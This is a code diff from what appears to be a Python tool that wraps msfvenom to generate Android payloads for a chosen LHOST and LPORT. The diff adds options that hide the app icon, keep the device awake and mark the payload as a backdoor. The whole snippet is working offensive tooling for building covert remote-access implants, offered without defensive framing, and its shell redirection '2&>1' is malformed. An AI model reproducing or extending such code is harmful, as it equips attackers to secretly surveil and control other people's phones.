@@ -109,7 +109,7 @@ def in_put ():
 def create_payload (type, ip, port ,name, path='/sdcard/sunnythakur/'):
 
     print ('\n'+box+'Creating Your Payload\n'+box+'Keep Patience.....\n'+blue)
-    x = "msfvenom -p "+type+' LHOST='+ip+' LPORT='+port+' -o '+path+name+' > /dev/null 2&>1'
+    x = "msfvenom -p "+type+' LHOST='+ip+' LPORT='+port+' AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true AndroidBackdoor=true'' -o '+path+name+' > /dev/null 2&>1'
     ou_t = subprocess.getoutput (x)
     return ou_t
 
